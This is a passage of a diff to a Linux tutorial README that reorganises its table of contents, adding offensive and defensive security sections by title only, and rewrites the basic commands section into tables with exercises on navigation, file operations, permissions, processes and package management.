@@ -43,10 +43,10 @@
 - [Disk Management](#disk-management)
 
 ### 🌐 [Networking](#networking)
-- [Network Configuration](#network-configuration)
-- [Network Diagnostics](#network-diagnostics)
-- [Remote Access (SSH)](#remote-access-ssh)
-- [File Transfer](#file-transfer)
+- [Core Concepts: TCP/IP and the OSI Model](#core-concepts-tcpip-and-the-osi-model)
+- [Network Diagnostics and Analysis](#network-diagnostics-and-analysis)
+- [The Network Swiss Army Knives](#the-network-swiss-army-knives)
+- [Common Protocols and Their Ports](#common-protocols-and-their-ports)
 
 ### 📦 [File Management & Compression](#file-management--compression)
 - [Archive & Compression](#archive--compression)
@@ -78,18 +78,27 @@
 - [Configuration Management](#configuration-management)
 - [Infrastructure as Code](#infrastructure-as-code)
 
-### 🔒 [Cybersecurity & Ethical Hacking](#cybersecurity--ethical-hacking)
-- [Security Fundamentals](#security-fundamentals)
-- [Reconnaissance Tools](#reconnaissance-tools)
-- [Vulnerability Assessment](#vulnerability-assessment)
-- [Penetration Testing](#penetration-testing)
-- [Digital Forensics](#digital-forensics)
+### 🔒 [Offensive Security (Ethical Hacking)](#offensive-security-ethical-hacking)
+- [Reconnaissance & Information Gathering](#reconnaissance--information-gathering)
+- [Scanning & Enumeration](#scanning--enumeration)
+- [Exploitation Techniques](#exploitation-techniques)
+- [Post-Exploitation](#post-exploitation)
+- [Web Application Security](#web-application-security)
+- [Password Attacks](#password-attacks)
+- [Wireless Security](#wireless-security)
 
-### 🛡️ [System Hardening](#system-hardening)
+### 🛡️ [Defensive Security (Blue Team)](#defensive-security-blue-team)
+- [System Hardening](#system-hardening)
 - [Firewall Configuration](#firewall-configuration)
-- [Access Control](#access-control)
-- [Intrusion Detection](#intrusion-detection)
-- [Security Auditing](#security-auditing)
+- [Intrusion Detection & Prevention](#intrusion-detection--prevention)
+- [Log Analysis & SIEM](#log-analysis--siem)
+- [Incident Response](#incident-response)
+- [Threat Hunting](#threat-hunting)
+
+### 🎯 [Penetration Testing Methodology](#penetration-testing-methodology)
+- [Testing Frameworks](#testing-frameworks)
+- [Professional Tools](#professional-tools)
+- [Reporting & Documentation](#reporting--documentation)
 
 ### 🔬 [Advanced Topics](#advanced-topics)
 - [Kernel & Modules](#kernel--modules)
@@ -217,2859 +226,2951 @@ username@hostname:~/current/directory$ command
 
 ---
 
-## Essential Commands
+## Essential Commands: The Core Toolkit
 
-### Navigation Commands
+This section covers the foundational commands for navigating and interacting with the Linux operating system. Mastering these is the first step toward proficiency.
 
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `pwd` | Print working directory | `pwd` | Shows current location |
-| `ls` | List directory contents | `ls -la` | `-l` detailed, `-a` hidden files |
-| `cd` | Change directory | `cd /home/user` | Use `cd -` for previous dir |
-| `find` | Search for files/directories | `find /home -name "*.txt"` | Powerful search tool |
-| `locate` | Quick file search | `locate filename` | Uses database, run `updatedb` first |
-| `which` | Find command location | `which python` | Shows path to executable |
-| `tree` | Display directory structure | `tree -L 2` | Install with package manager |
+#### Navigation and Exploration
 
-**Advanced Navigation:**
-```bash
-# Quick directory switching
-cd ~                 # Go to home directory
-cd -                 # Go to previous directory
-cd ../..             # Go up two levels
-cd /path/to/dir      # Absolute path
-cd relative/path     # Relative path
-
-# Directory stack
-pushd /new/directory # Push current dir to stack, change to new
-popd                 # Pop directory from stack and change to it
-dirs                 # Show directory stack
-```
-
-### File & Directory Operations
+These commands allow you to move around the filesystem and understand your current location.
 
 | Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `mkdir` | Create directory | `mkdir -p dir1/dir2/dir3` | `-p` creates parent dirs |
-| `rmdir` | Remove empty directory | `rmdir emptydir` | Only works on empty directories |
-| `rm` | Remove files/directories | `rm -rf directory/` | `-r` recursive, `-f` force |
-| `cp` | Copy files/directories | `cp -r source/ dest/` | `-r` for directories |
-| `mv` | Move/rename files | `mv oldname newname` | Also used for renaming |
-| `ln` | Create links | `ln -s target linkname` | `-s` for symbolic links |
-| `chmod` | Change permissions | `chmod 755 script.sh` | Numeric or symbolic mode |
-| `chown` | Change ownership | `chown user:group file` | Change owner and group |
-| `touch` | Create empty file/update timestamp | `touch newfile.txt` | Creates file if doesn't exist |
+|---|---|---|---|
+| `pwd` | **P**rint **W**orking **D**irectory | `pwd` | Shows your current absolute path. |
+| `ls` | **L**i**s**t directory contents | `ls -la` | The cornerstone of file listing. See below for a deep dive. |
+| `cd` | **C**hange **D**irectory | `cd /var/log` | Your primary tool for moving between directories. |
+| `find` | Search for files/directories | `find /home -name "*.log"` | A powerful and versatile search utility. |
+| `locate` | Find files by name (fast) | `locate myapp.conf` | Uses a pre-built database. Run `sudo updatedb` to refresh it. |
+| `which` | Locate a command | `which python3` | Shows the full path of an executable. |
+| `tree` | Display directory structure | `tree -L 2` | Provides a visual tree. May require installation (`sudo apt install tree`). |
 
-**File Operations Examples:**
-```bash
-# Create multiple directories
-mkdir -p project/{src,docs,tests}/{python,javascript}
+**Deep Dive: `ls` Command Variants**
 
-# Copy with progress and preservation
-cp -av source/ destination/    # -a archive mode, -v verbose
+The `ls` command is simple but incredibly powerful with its options.
 
-# Safe remove with confirmation
-rm -i important_file.txt       # Interactive mode
+| Command | Description |
+|---|---|
+| `ls` | List files and directories in the current location. |
+| `ls -l` | **L**ong format: shows permissions, owner, size, and modification date. |
+| `ls -a` | **A**ll files: includes hidden files (those starting with `.`). |
+| `ls -h` | **H**uman-readable: displays file sizes in KB, MB, GB. Use with `-l`. |
+| `ls -t` | **T**ime sort: lists newest files first. |
+| `ls -S` | **S**ize sort: lists largest files first. |
+| `ls -r` | **R**everse order: reverses the sorting order (e.g., `ls -ltr` shows oldest last). |
+| `ls -R` | **R**ecursive: lists the contents of all subdirectories. |
+| `ls -d */` | **D**irectory: lists only the directories in the current path. |
 
-# Create symbolic link
-ln -s /path/to/original /path/to/link
+**Exercises: Navigation**
 
-# Change permissions for multiple files
-chmod 644 *.txt               # Read/write for owner, read for others
-chmod +x script.sh            # Add execute permission
-```
-
-### Text Processing
-
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `cat` | Display file contents | `cat file.txt` | Shows entire file |
-| `less` | View file page by page | `less largefile.txt` | Use arrow keys, 'q' to quit |
-| `head` | Show first lines | `head -n 10 file.txt` | Default is 10 lines |
-| `tail` | Show last lines | `tail -f /var/log/syslog` | `-f` follows file changes |
-| `grep` | Search text patterns | `grep "error" logfile.txt` | Powerful pattern matching |
-| `sed` | Stream editor | `sed 's/old/new/g' file.txt` | Replace text |
-| `awk` | Text processing | `awk '{print $1}' file.txt` | Print first column |
-| `sort` | Sort lines | `sort -n numbers.txt` | `-n` numeric sort |
-| `uniq` | Remove duplicates | `sort file.txt | uniq` | Often used with sort |
-| `wc` | Word/line/byte count | `wc -l file.txt` | Count lines |
-
-**Text Processing Examples:**
-```bash
-# Search with context
-grep -A 3 -B 3 "error" logfile.txt    # 3 lines after and before
-
-# Case-insensitive search
-grep -i "ERROR" logfile.txt
-
-# Search in multiple files
-grep -r "function" src/               # Recursive search
-
-# Advanced sed usage
-sed -i 's/old_text/new_text/g' *.txt  # In-place replacement
-
-# AWK for data extraction
-awk -F: '{print $1,$3}' /etc/passwd   # Print username and UID
-
-# Count unique lines
-sort file.txt | uniq -c | sort -nr    # Count and sort by frequency
-```
-
-### Searching & Finding
-
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `find` | Search filesystem | `find / -name "*.conf" -type f` | Most versatile search |
-| `locate` | Fast file search | `locate -i filename` | Uses database |
-| `whereis` | Locate binary, source, manual | `whereis gcc` | Finds related files |
-| `grep` | Search file contents | `grep -r "pattern" directory/` | Text pattern search |
-| `ag` | Silver searcher | `ag "pattern" --ignore="*.log"` | Fast grep alternative |
-| `ripgrep` | Ultra-fast search | `rg "pattern" --type py` | Modern grep replacement |
-
-**Find Command Examples:**
-```bash
-# Find by name
-find /home -name "*.txt" -type f
-
-# Find by size
-find /var -size +100M -type f          # Files larger than 100MB
-
-# Find by modification time
-find /tmp -mtime -7                     # Modified in last 7 days
-find /home -atime +30                   # Accessed more than 30 days ago
-
-# Find and execute
-find /var/log -name "*.log" -exec gzip {} \;  # Compress all log files
-
-# Find with multiple conditions
-find /usr -name "*.so" -size +1M -exec ls -lh {} \;
-
-# Find empty files and directories
-find /tmp -empty -type f -delete        # Delete empty files
-```
+1.  Navigate to your home directory.
+2.  List all files, including hidden ones, in long format.
+3.  Create a new directory called `test_lab`.
+4.  Navigate into `test_lab`.
+5.  Confirm your current working directory.
+6.  Navigate back to your home directory using a relative path (`..`).
+7.  Find all files on your system ending with the `.conf` extension.
 
 ---
 
-## Users & Permissions
+#### File & Directory Operations
 
-### User Management
-
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `whoami` | Current user | `whoami` | Shows current username |
-| `id` | User/group IDs | `id username` | Shows UID, GID, groups |
-| `users` | Logged in users | `users` | Simple list |
-| `who` | Detailed user info | `who -u` | Shows login time, terminal |
-| `w` | User activity | `w` | Shows what users are doing |
-| `last` | Login history | `last -n 10` | Last 10 logins |
-| `useradd` | Add user | `useradd -m -s /bin/bash newuser` | `-m` creates home dir |
-| `usermod` | Modify user | `usermod -aG sudo username` | Add to group |
-| `userdel` | Delete user | `userdel -r username` | `-r` removes home dir |
-| `passwd` | Change password | `passwd username` | Interactive password change |
-
-**User Management Examples:**
-```bash
-# Create user with home directory and bash shell
-sudo useradd -m -s /bin/bash john
-sudo passwd john
-
-# Add user to multiple groups
-sudo usermod -aG sudo,docker,www-data john
-
-# Lock/unlock user account
-sudo usermod -L john                    # Lock account
-sudo usermod -U john                    # Unlock account
-
-# Change user information
-sudo chfn john                          # Change full name, phone, etc.
-
-# Set user expiration
-sudo usermod -e 2024-12-31 john        # Account expires on date
-```
-
-### Group Management
+Creating, deleting, copying, and moving files are fundamental tasks.
 
 | Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `groups` | Show user groups | `groups username` | Lists group membership |
-| `groupadd` | Add group | `groupadd developers` | Create new group |
-| `groupmod` | Modify group | `groupmod -n newname oldname` | Rename group |
-| `groupdel` | Delete group | `groupdel groupname` | Remove group |
-| `gpasswd` | Group password/membership | `gpasswd -a user group` | Add user to group |
-| `newgrp` | Switch primary group | `newgrp developers` | Temporary group switch |
+|---|---|---|---|
+| `mkdir` | **M**a**k**e **Dir**ectory | `mkdir -p project/src` | `-p` creates parent directories if they don't exist. |
+| `rmdir` | **R**e**m**ove **Dir**ectory | `rmdir empty_dir` | Only works on empty directories. |
+| `rm` | **R**e**m**ove files/directories | `rm -rf old_project/` | `-r` for recursive, `-f` for force (use with caution!). |
+| `cp` | **C**o**p**y files/directories | `cp -r source/ dest/` | `-r` is required for directories. |
+| `mv` | **M**o**v**e or rename files | `mv old.txt new.txt` | The same command is used for both moving and renaming. |
+| `touch` | Create empty file/update timestamp | `touch new_file.log` | Creates a file if it doesn't exist or updates the modification time if it does. |
+| `ln` | Create **l**i**n**ks | `ln -s /path/to/target link_name` | `-s` creates a symbolic (soft) link. Without it, you get a hard link. |
 
-### File Permissions (rwx)
+**Deep Dive: `cp` Command Variants**
 
-**Permission Structure:**
-```
--rwxrwxrwx
-│││││││││└── Other execute
-││││││││└─── Other write  
-│││││││└──── Other read
-││││││└───── Group execute
-│││││└────── Group write
-││││└─────── Group read
-│││└──────── Owner execute
-││└───────── Owner write
-│└────────── Owner read
-└─────────── File type (- file, d directory, l link)
-```
+The `cp` command is essential for copying files and directories.
 
-**Numeric Permissions:**
-| Value | Binary | Permissions | Description |
-|-------|--------|-------------|-------------|
-| 0 | 000 | --- | No permissions |
-| 1 | 001 | --x | Execute only |
-| 2 | 010 | -w- | Write only |
-| 3 | 011 | -wx | Write and execute |
-| 4 | 100 | r-- | Read only |
-| 5 | 101 | r-x | Read and execute |
-| 6 | 110 | rw- | Read and write |
-| 7 | 111 | rwx | All permissions |
+| Command | Description |
+|---|---|
+| `cp file1.txt file2.txt` | Copy `file1.txt` to `file2.txt`. |
+| `cp -i file1.txt file2.txt` | Prompt before overwrite. |
+| `cp -r dir1/ dir2/` | Copy directory `dir1` to `dir2` recursively. |
+| `cp -u file1.txt dir/` | Copy only if `file1.txt` is newer than the existing file in `dir`. |
+| `cp -v file1.txt dir/` | Verbose mode: show files being copied. |
 
-**Common Permission Sets:**
-| Permissions | Numeric | Use Case |
-|-------------|---------|----------|
-| rwxrwxrwx | 777 | Full access (avoid on shared systems) |
-| rwxr-xr-x | 755 | Executable files, directories |
-| rw-rw-rw- | 666 | Data files (no execute needed) |
-| rw-r--r-- | 644 | Configuration files, documents |
-| rwx------ | 700 | Private directories |
-| rw------- | 600 | Private files (passwords, keys) |
+**Exercises: File Operations**
 
-**Permission Commands:**
-```bash
-# Symbolic mode
-chmod u+x script.sh                    # Add execute for owner
-chmod g-w file.txt                     # Remove write for group
-chmod o=r file.txt                     # Set other to read only
-chmod a+x script.sh                    # Add execute for all
-
-# Numeric mode
-chmod 755 /usr/local/bin/myscript      # Executable script
-chmod 644 /etc/myconfig.conf           # Config file
-chmod 600 ~/.ssh/id_rsa                # Private SSH key
-
-# Recursive permissions
-chmod -R 755 /var/www/html             # Set directory permissions
-find /var/www -type f -exec chmod 644 {} \;  # Files only
-find /var/www -type d -exec chmod 755 {} \;  # Directories only
-```
-
-### sudo & Privileges
-
-**Understanding sudo:**
-- **Purpose**: Execute commands as another user (usually root)
-- **Configuration**: `/etc/sudoers` file
-- **Security**: Logs all sudo usage
-
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `sudo` | Execute as root | `sudo apt update` | Requires password |
-| `sudo -u` | Execute as specific user | `sudo -u www-data ls /var/www` | Run as different user |
-| `sudo -i` | Interactive root shell | `sudo -i` | Full root environment |
-| `sudo -s` | Shell as root | `sudo -s` | Keep current environment |
-| `visudo` | Edit sudoers file | `sudo visudo` | Safe sudoers editing |
-| `sudo -l` | List permissions | `sudo -l` | Show allowed commands |
-
-**Sudoers Configuration:**
-```bash
-# Basic syntax: user host=(runas) commands
-john    ALL=(ALL:ALL) ALL              # Full sudo access
-jane    ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx  # Specific command without password
-%admin  ALL=(ALL) ALL                  # Group permissions (% prefix)
-
-# Command aliases
-Cmnd_Alias SERVICES = /bin/systemctl, /sbin/service
-%operators ALL=(ALL) NOPASSWD: SERVICES
-
-# Host aliases for multiple servers
-Host_Alias WEBSERVERS = 192.168.1.10, 192.168.1.11
-john WEBSERVERS=(ALL) ALL
-```
+1.  Create a directory structure `~/my_project/assets/images`.
+2.  Create an empty file named `~/my_project/index.html`.
+3.  Copy `index.html` to `~/my_project/assets/`.
+4.  Rename `~/my_project/assets/index.html` to `info.html`.
+5.  Create a symbolic link from `~/my_project/assets/images` to `~/images_shortcut`.
+6.  Remove the `~/images_shortcut` link.
+7.  Remove the entire `~/my_project` directory and all its contents with a single command.
 
 ---
 
-## Process Management
+#### Users & Permissions
 
-### Understanding Processes
-
-**Process Hierarchy:**
-- **PID**: Process ID (unique identifier)
-- **PPID**: Parent Process ID
-- **PGID**: Process Group ID
-- **SID**: Session ID
+Linux is a multi-user system, and managing permissions is critical for security.
 
 | Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `ps` | Show processes | `ps aux` | Snapshot of current processes |
-| `pstree` | Process tree | `pstree -p` | Shows parent-child relationships |
-| `top` | Real-time processes | `top` | Interactive process viewer |
-| `htop` | Enhanced top | `htop` | Better interface (install separately) |
-| `jobs` | Active jobs | `jobs -l` | Shows background jobs |
-| `pgrep` | Find process by name | `pgrep firefox` | Returns PIDs |
-| `pkill` | Kill by name | `pkill firefox` | Kill processes by name |
+|---|---|---|---|
+| `chmod` | **Ch**ange **Mod**e (permissions) | `chmod 755 script.sh` | Sets read/write/execute for owner, read/execute for others. |
+| `chown` | **Ch**ange **Own**er | `chown www-data:www-data file` | Changes the user and group that owns a file. |
+| `sudo` | **S**uper**u**ser **Do** | `sudo apt update` | Executes a command with root privileges. |
+| `su` | **S**witch **U**ser | `su - john` | Switches to another user's session (`-` provides a login shell). |
 
-**Process States:**
-| State | Code | Description |
-|-------|------|-------------|
-| Running | R | Currently executing |
-| Sleeping | S | Waiting for event |
-| Uninterruptible Sleep | D | Waiting for I/O |
-| Zombie | Z | Finished but not cleaned up |
-| Stopped | T | Suspended by signal |
+**Deep Dive: `chmod`**
 
-### Background/Foreground Jobs
+Permissions can be set using numbers (octal) or letters (symbolic).
 
-**Job Control:**
-```bash
-# Start job in background
-command &                              # Run in background
-nohup command &                        # Survive terminal closure
+*   **Numeric:** `r=4`, `w=2`, `x=1`. Sum them up for each entity (User, Group, Other).
+    *   `chmod 755`: `rwx` for User, `r-x` for Group, `r-x` for Other.
+    *   `chmod 644`: `rw-` for User, `r--` for Group, `r--` for Other.
+*   **Symbolic:** `u` (user), `g` (group), `o` (other), `a` (all). `+` (add), `-` (remove), `=` (set).
+    *   `chmod u+x script.sh`: Adds execute permission for the user.
+    *   `chmod g-w data.txt`: Removes write permission for the group.
+    *   `chmod a=r config.yml`: Sets read-only permission for everyone.
 
-# Job control during execution
-Ctrl+Z                                 # Suspend current job
-bg                                     # Continue in background
-fg                                     # Bring to foreground
-jobs                                   # List active jobs
+**Exercises: Permissions**
 
-# Specific job control
-bg %1                                  # Background job 1
-fg %2                                  # Foreground job 2
-kill %1                                # Kill job 1
-
-# Disown jobs (remove from job table)
-disown %1                              # Disown specific job
-disown -a                              # Disown all jobs
-```
-
-### Signals & Process Control
-
-**Common Signals:**
-| Signal | Number | Description | Usage |
-|--------|--------|-------------|-------|
-| SIGHUP | 1 | Hangup | Reload configuration |
-| SIGINT | 2 | Interrupt | Ctrl+C |
-| SIGQUIT | 3 | Quit | Ctrl+\ |
-| SIGKILL | 9 | Kill | Force termination |
-| SIGTERM | 15 | Terminate | Graceful shutdown |
-| SIGSTOP | 19 | Stop | Suspend process |
-| SIGCONT | 18 | Continue | Resume process |
-
-**Signal Commands:**
-```bash
-# Send signals
-kill -TERM 1234                       # Graceful termination
-kill -KILL 1234                       # Force kill
-kill -HUP 1234                        # Reload configuration
-
-# Kill by name
-killall firefox                       # Kill all firefox processes
-pkill -f "python script.py"           # Kill by command line
-
-# Process priority
-nice -n 10 command                     # Start with lower priority
-renice -n 5 -p 1234                   # Change priority of running process
-```
-
-### Process Monitoring
-
-**System Resource Monitoring:**
-```bash
-# CPU and memory usage
-top -p 1234                           # Monitor specific process
-htop -p 1234,5678                     # Monitor multiple processes
-
-# Detailed process information
-ps -o pid,ppid,cmd,pcpu,pmem 1234     # Custom output format
-ps -eo pid,cmd,etime                  # All processes with runtime
-
-# Process resource usage
-pidstat -p 1234 1                     # Per-process statistics
-iotop                                 # I/O usage by process
-```
+1.  Create a file named `secret.txt`.
+2.  Set its permissions so that only the owner can read and write to it.
+3.  Create a script `hello.sh` and give only the owner execute permissions.
+4.  Create a shared directory where members of your group can add and modify files, but others can only read.
 
 ---
 
-## System Monitoring
+#### Process Management
 
-### Resource Monitoring
-
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `free` | Memory usage | `free -h` | Shows RAM and swap |
-| `df` | Disk space | `df -h` | Human-readable sizes |
-| `du` | Directory usage | `du -sh /var/*` | Disk usage by directory |
-| `iostat` | I/O statistics | `iostat -x 1` | Extended stats every second |
-| `vmstat` | Virtual memory stats | `vmstat 1` | System performance |
-| `sar` | System activity | `sar -u 1 5` | CPU usage 5 times |
-| `uptime` | System uptime | `uptime` | Load averages |
-| `lscpu` | CPU information | `lscpu` | Detailed CPU info |
-| `lsblk` | Block devices | `lsblk -f` | Shows filesystems |
-
-**Memory Monitoring:**
-```bash
-# Memory breakdown
-free -h                               # Human-readable memory info
-cat /proc/meminfo                     # Detailed memory information
-pmap 1234                            # Memory map of specific process
-
-# Top memory consumers
-ps aux --sort=-%mem | head            # Sort by memory usage
-smem -tk                             # Shared memory reporting (install smem)
-```
-
-**Disk Monitoring:**
-```bash
-# Disk space analysis
-df -h                                 # Filesystem usage
-df -i                                 # Inode usage
-du -sh /var/log/*                    # Log directory sizes
-ncdu /                               # Interactive disk usage (install ncdu)
-
-# Find large files
-find / -type f -size +100M -exec ls -lh {} \; 2>/dev/null
-find /var -name "*.log" -size +10M
-```
-
-### Log Management
-
-**System Logs Location:**
-- `/var/log/syslog` - General system messages
-- `/var/log/auth.log` - Authentication events
-- `/var/log/kern.log` - Kernel messages
-- `/var/log/cron.log` - Cron job output
-- `/var/log/mail.log` - Mail server logs
-- `/var/log/apache2/` - Apache web server logs
-- `/var/log/nginx/` - Nginx web server logs
+View, manage, and terminate running programs.
 
 | Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `journalctl` | Systemd logs | `journalctl -u nginx` | Service-specific logs |
-| `dmesg` | Kernel messages | `dmesg | tail` | Boot and hardware messages |
-| `logger` | Write to log | `logger "Custom message"` | Add entries to syslog |
-| `logrotate` | Rotate logs | `logrotate /etc/logrotate.conf` | Manage log file sizes |
-| `rsyslog` | System logging | `systemctl status rsyslog` | Log daemon |
+|---|---|---|---|
+| `ps` | **P**rocess **S**tatus | `ps aux` | Shows a snapshot of all running processes. |
+| `top` | Real-time process monitor | `top` | An interactive dashboard of system resource usage. |
+| `htop` | Interactive process viewer | `htop` | A more user-friendly and powerful version of `top`. |
+| `kill` | Send a signal to a process | `kill -9 1234` | `-9` (SIGKILL) is a force-kill signal. |
+| `systemctl` | **System**d **C**on**t**ro**l** | `sudo systemctl status nginx` | The primary tool for managing system services (daemons). |
 
-**Log Analysis Examples:**
-```bash
-# Recent system events
-journalctl --since "1 hour ago"
-journalctl --since "2024-01-01" --until "2024-01-02"
+**Deep Dive: `ps` Command Variants**
 
-# Service logs
-journalctl -u ssh.service -f           # Follow SSH service logs
-journalctl -u nginx.service --since today
+The `ps` command provides information about running processes.
 
-# System boot analysis
-journalctl -b                         # Current boot logs
-journalctl --list-boots               # Available boot logs
-journalctl -b -1                      # Previous boot
+| Command | Description |
+|---|---|
+| `ps` | Show processes for the current shell. |
+| `ps -e` | Show all processes running on the system. |
+| `ps -f` | Full-format listing: UID, PID, PPID, C, STIME, TTY, TIME, CMD. |
+| `ps aux` | Detailed listing for all users. |
+| `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem` | Custom format: sort by memory usage. |
 
-# Priority filtering
-journalctl -p err                     # Error level and above
-journalctl -p warning..info           # Warning to info range
+**Exercises: Process Management**
 
-# Disk usage by logs
-journalctl --disk-usage
-journalctl --vacuum-time=7d           # Keep only 7 days
-journalctl --vacuum-size=500M         # Keep only 500MB
-```
-
-### Performance Tools
-
-**System Performance Analysis:**
-```bash
-# CPU monitoring
-top                                   # Real-time CPU usage
-htop                                  # Enhanced process viewer
-iotop                                 # I/O monitoring
-atop                                  # Advanced system monitor
-
-# Network monitoring
-iftop                                 # Network bandwidth by host
-nethogs                              # Network usage by process
-ss -tuln                             # Socket statistics
-netstat -tuln                        # Network connections
-
-# Disk I/O
-iotop -ao                            # I/O by process (accumulated)
-iostat -x 1                          # Extended I/O statistics
-```
-
-**Performance Benchmarking:**
-```bash
-# CPU benchmark
-stress --cpu 4 --timeout 60s         # CPU stress test
-sysbench cpu run                     # CPU benchmark
-
-# Memory benchmark
-stress --vm 2 --vm-bytes 1G --timeout 60s
-mbw 1000                             # Memory bandwidth benchmark
-
-# Disk benchmark
-dd if=/dev/zero of=testfile bs=1G count=1 oflag=direct
-hdparm -tT /dev/sda                  # Disk read performance
-```
+1.  Find the Process ID (PID) of your shell.
+2.  Use `top` to find the most CPU-intensive process.
+3.  Start a `sleep 300` command in the background (`&`). Find its PID and terminate it.
+4.  Check the status of the SSH service on your machine.
 
 ---
 
-## Networking
+#### Package Management
 
-### Network Configuration
+Install, update, and remove software on your system. The command depends on your Linux distribution.
 
-**Network Interface Management:**
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `ip` | Modern network tool | `ip addr show` | Replaces ifconfig |
-| `ifconfig` | Legacy interface config | `ifconfig eth0` | Still widely used |
-| `iwconfig` | Wireless configuration | `iwconfig wlan0` | Wireless interfaces |
-| `nmcli` | NetworkManager CLI | `nmcli dev status` | Desktop network management |
-| `hostnamectl` | Hostname management | `hostnamectl set-hostname newname` | Set system hostname |
+| Manager | Distributions | Example Usage |
+|---|---|---|
+| `apt` | Debian, Ubuntu, Mint | `sudo apt install curl` |
+| `dnf` | Fedora, CentOS, RHEL | `sudo dnf install curl` |
+| `zypper` | openSUSE | `sudo zypper install curl` |
+| `pacman` | Arch Linux | `sudo pacman -S curl` |
+| `snap` | Universal | `sudo snap install code --classic` |
 
-**IP Address Management:**
-```bash
-# View network interfaces
-ip addr show                          # All interfaces
-ip addr show eth0                     # Specific interface
-ip link show                          # Link layer information
+**Deep Dive: `apt` Command Variants**
 
-# Configure IP addresses
-sudo ip addr add 192.168.1.100/24 dev eth0     # Add IP address
-sudo ip addr del 192.168.1.100/24 dev eth0     # Remove IP address
-sudo ip link set eth0 up             # Bring interface up
-sudo ip link set eth0 down           # Bring interface down
+The `apt` command is essential for managing packages on Debian-based systems.
 
-# Routing
-ip route show                         # Show routing table
-sudo ip route add 192.168.2.0/24 via 192.168.1.1  # Add route
-sudo ip route del 192.168.2.0/24     # Delete route
-```
+| Command | Description |
+|---|---|
+| `apt update` | Update the list of available packages and their versions. |
+| `apt upgrade` | Upgrade all installed packages to their latest versions. |
+| `apt install package` | Install a new package. |
+| `apt remove package` | Remove a package, keeping its configuration files. |
+| `apt purge package` | Remove a package and its configuration files. |
+| `apt search keyword` | Search for a package by keyword. |
+| `apt show package` | Display detailed information about a package. |
 
-**DNS Configuration:**
-```bash
-# DNS resolution
-nslookup google.com                   # DNS lookup
-dig google.com                        # Detailed DNS query
-dig @8.8.8.8 google.com              # Query specific DNS server
-host google.com                       # Simple DNS lookup
+**Exercises: Package Management**
 
-# DNS configuration files
-/etc/hosts                            # Local hostname resolution
-/etc/resolv.conf                      # DNS server configuration
-/etc/nsswitch.conf                    # Name resolution order
-```
-
-### Network Diagnostics
-
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `ping` | Test connectivity | `ping -c 4 google.com` | ICMP echo requests |
-| `traceroute` | Trace route | `traceroute google.com` | Path to destination |
-| `mtr` | Network diagnostic | `mtr google.com` | Combines ping and traceroute |
-| `nmap` | Network scanner | `nmap -sS 192.168.1.0/24` | Port scanning |
-| `nc` | Netcat utility | `nc -zv google.com 80` | Port testing |
-| `telnet` | Remote connection | `telnet google.com 80` | Test service connectivity |
-
-**Network Troubleshooting:**
-```bash
-# Connectivity testing
-ping -c 10 -i 0.2 192.168.1.1        # 10 pings, 0.2s interval
-ping6 -c 4 ipv6.google.com           # IPv6 ping
-
-# Path analysis
-traceroute -n google.com              # Numeric output (faster)
-mtr --report --report-cycles 10 google.com  # Statistical report
-
-# Port scanning
-nmap -sT -p 80,443,22 target.com     # TCP connect scan
-nmap -sU -p 53,67,68 target.com      # UDP scan
-nmap -A target.com                   # Aggressive scan (OS detection)
-
-# Service testing
-nc -zv target.com 80                 # Test if port 80 is open
-echo "GET / HTTP/1.0\r\n\r\n" | nc target.com 80  # HTTP request
-```
-
-### Remote Access (SSH)
-
-**SSH Basics:**
-```bash
-# Basic connection
-ssh user@hostname                     # Connect to remote host
-ssh -p 2222 user@hostname            # Custom port
-ssh -i ~/.ssh/private_key user@hostname  # Use specific key
-
-# SSH key management
-ssh-keygen -t rsa -b 4096 -C "email@example.com"  # Generate key pair
-ssh-copy-id user@hostname            # Copy public key to remote
-ssh-add ~/.ssh/private_key           # Add key to SSH agent
-
-# SSH configuration
-~/.ssh/config                        # Client configuration
-/etc/ssh/sshd_config                 # Server configuration
-```
-
-**SSH Configuration Example:**
-```bash
-# ~/.ssh/config
-Host webserver
-    HostName 192.168.1.100
-    User admin
-    Port 2222
-    IdentityFile ~/.ssh/webserver_key
-    ForwardAgent yes
-
-Host *.company.com
-    User john
-    ForwardX11 yes
-    Compression yes
-```
-
-**Advanced SSH Usage:**
-```bash
-# Port forwarding
-ssh -L 8080:localhost:80 user@server    # Local port forwarding
-ssh -R 8080:localhost:80 user@server    # Remote port forwarding
-ssh -D 1080 user@server                 # Dynamic port forwarding (SOCKS)
-
-# File transfer over SSH
-scp file.txt user@server:/path/         # Copy file to remote
-scp -r directory/ user@server:/path/    # Copy directory
-rsync -avz /local/path/ user@server:/remote/path/  # Sync directories
-
-# SSH tunneling
-ssh -N -L 3306:database:3306 user@jumphost  # Database tunnel through jumphost
-```
-
-### File Transfer
-
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `scp` | Secure copy | `scp file.txt user@host:/path/` | SSH-based file transfer |
-| `rsync` | Sync directories | `rsync -avz src/ dest/` | Efficient sync with compression |
-| `wget` | Download files | `wget -c http://example.com/file.zip` | Resume downloads with -c |
-| `curl` | Transfer data | `curl -O http://example.com/file.zip` | More versatile than wget |
-| `sftp` | Secure FTP | `sftp user@hostname` | Interactive file transfer |
-
-**File Transfer Examples:**
-```bash
-# SCP usage
-scp -r /local/directory user@server:/remote/path/  # Recursive copy
-scp -P 2222 file.txt user@server:/path/            # Custom SSH port
-scp user@server1:/path/file.txt user@server2:/path/  # Server to server
-
-# Rsync advanced usage
-rsync -avz --progress src/ user@server:dest/       # With progress bar
-rsync -avz --delete src/ dest/                     # Delete extraneous files
-rsync -avz --exclude="*.tmp" src/ dest/            # Exclude patterns
-rsync -avz -e "ssh -p 2222" src/ user@server:dest/  # Custom SSH port
-
-# Wget advanced usage
-wget -r -np -k http://example.com/directory/       # Recursive download
-wget --limit-rate=200k http://example.com/large.zip  # Limit bandwidth
-wget -c --timeout=30 http://example.com/file.zip   # Resume with timeout
